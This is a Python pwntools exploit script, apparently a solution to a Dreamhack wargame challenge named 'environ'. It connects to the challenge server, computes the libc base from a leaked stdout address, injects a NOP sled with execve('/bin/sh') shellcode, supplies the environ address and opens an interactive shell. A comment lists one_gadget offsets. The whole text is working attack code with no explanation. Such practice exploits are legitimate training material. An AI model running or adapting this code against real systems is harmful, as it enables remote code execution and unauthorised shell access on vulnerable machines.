from pwn import *
context.update(log_level = 'debug')
context.arch = 'x86_64'

p = remote('host1.dreamhack.games', 9337)
#p = process('environ')
libc = ELF('libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset_env = libc.symbols['environ']
log.info('offset_environ: ' + hex(offset_env))
addr_libc_stdout = int(p.recvline().replace('\n', '').split(': ')[1],16)
log.info('addr_libc_stdout: ' + hex(addr_libc_stdout))
offset_stdout = libc.symbols['_IO_2_1_stdout_']
addr_libc_base = addr_libc_stdout - offset_stdout
addr_libc_env = addr_libc_base + offset_env

log.info('libc_base: ' + hex(addr_libc_base))
log.info('libc_env: ' + hex(addr_libc_env))
p.sendlineafter(': ', str(0x200))
addr_oneshot = addr_libc_base + 0x10a45c
shellcode = asm(shellcraft.execve('/bin/sh'))
p.sendlineafter(': ', '\x90'*0x150 + shellcode)
#raw_input('debug: ' + str(p.pid))
p.sendlineafter('=', str(addr_libc_env))
'''
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
p.interactive()
